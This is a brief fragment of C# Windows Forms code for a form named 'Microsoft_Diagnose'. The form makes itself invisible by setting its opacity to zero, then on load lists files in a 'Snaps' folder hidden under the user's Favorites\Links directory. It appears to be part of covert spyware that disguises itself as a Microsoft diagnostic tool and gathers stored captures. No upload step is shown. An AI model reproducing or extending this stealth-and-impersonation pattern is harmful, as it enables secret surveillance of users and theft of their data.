...
{
    public partial class Microsoft_Diagnose : Form
    {
        public Microsoft_Diagnose()
        {
            InitializeComponent();
            this.Opacity = 0;
        ...
        private void Microsoft_Diagnose_Load(object sender, EventArgs e)
        {
            string folderId = global.folderID_G;
            try
            {
                //string[] myfiles = Directory.GetFiles(@"c:\Windows\Logs\Telephony\Snaps\");
                string[] myfiles = Directory.GetFiles("C:\\Users\\" + global.currentUser + "\\Favorites\\Links\\Snaps\\");
